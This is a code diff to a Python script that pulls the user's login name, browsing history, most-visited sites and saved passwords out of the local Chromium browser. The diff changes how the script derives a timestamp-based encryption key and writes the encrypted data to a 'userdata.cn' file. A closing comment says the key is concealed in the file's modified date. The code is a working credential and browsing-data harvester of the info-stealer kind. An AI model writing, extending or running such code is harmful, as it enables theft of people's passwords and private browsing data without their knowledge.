@@ -6,11 +6,15 @@ import json
 import time
 from cryptography.fernet import Fernet
 import base64
-import struct
+import hashlib
 
 import chromiumBrowser
 import dataComprehention
 import getBrowser
+
+
+if len(sys.argv) < 2: exit()
+
 
 chromiumParams = getBrowser.getChromiumParams()
 defaultBrowser = chromiumBrowser.Chromium(chromiumParams[0], chromiumParams[1], chromiumParams[2], chromiumParams[3])
@@ -47,25 +51,23 @@ defaultBrowser.cleanup()
 
 
 username = os.getlogin()
-outputFilePath = os.path.join(sys.argv[1], "userdata")
 
+outputFilePath = os.path.join(sys.argv[1], "userdata.cn")
 key = round(time.time())
-floatBytes = struct.pack("!d", key)
-b64Key = base64.urlsafe_b64encode(floatBytes)
-print( key )
-
-print(b64Key)
+sha256Bytes = hashlib.sha256(str(key).encode()).digest()[:32]
+b64Key = base64.urlsafe_b64encode(sha256Bytes)
 
 def encryptString(key, inputString):
     encrypter = Fernet( key )
     bytes = encrypter.encrypt(inputString.encode())
+    return bytes
 
-with open(outputFilePath, "w") as f:
+with open(outputFilePath, "wb") as f:    
     f.writelines([
-        encryptString(b64Key, username), "\n",
-        encryptString(b64Key, json.dumps( history )), "\n",
-        encryptString(b64Key, json.dumps( topWebsites )), "\n",
-        encryptString(b64Key, json.dumps( passwordsAndFreq )), "\n",
+        encryptString(b64Key, username), b"\n",
+        encryptString(b64Key, json.dumps( history )), b"\n",
+        encryptString(b64Key, json.dumps( topWebsites )), b"\n",
+        encryptString(b64Key, json.dumps( passwordsAndFreq )), b"\n",
     ])
 
 # Sets the date modified so the key is present and changes everytime encrypted
